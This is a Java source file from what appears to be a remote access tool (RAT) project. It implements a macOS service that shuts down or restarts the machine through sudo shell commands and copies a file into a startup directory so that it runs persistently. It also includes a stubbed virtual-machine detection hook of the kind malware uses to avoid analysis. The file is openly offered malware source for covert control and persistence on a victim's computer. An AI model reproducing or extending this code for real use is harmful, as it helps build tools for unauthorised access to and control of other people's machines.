/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.service;

import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

import de.sogomn.engine.util.FileUtils;

public final class MacService implements IOperatingSystemService {
	
	private static final String SHUTDOWN_COMMAND = "sudo shutdown -h now";
	private static final String RESTART_COMMAND = "sudo shutdown -r now";
	private static final String STARTUP_DIRECTORY_PATH = "Macintosh HD" + File.separator + "Library" + File.separator + "Startup";
	
	MacService() {
		//...
	}
	
	@Override
	public void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void restart() {
		try {
			Runtime.getRuntime().exec(RESTART_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void addToStartup(final Path file) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + file.getFileName().toString();
		final Path destination = Paths.get(path);
		
		FileUtils.copyFile(file, destination);
	}
	
	@Override
	public void removeFromStartup(final String name) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final File file = new File(path);
		
		file.delete();
	}
	
	public boolean isVm() {
		return false;
	}
	
}
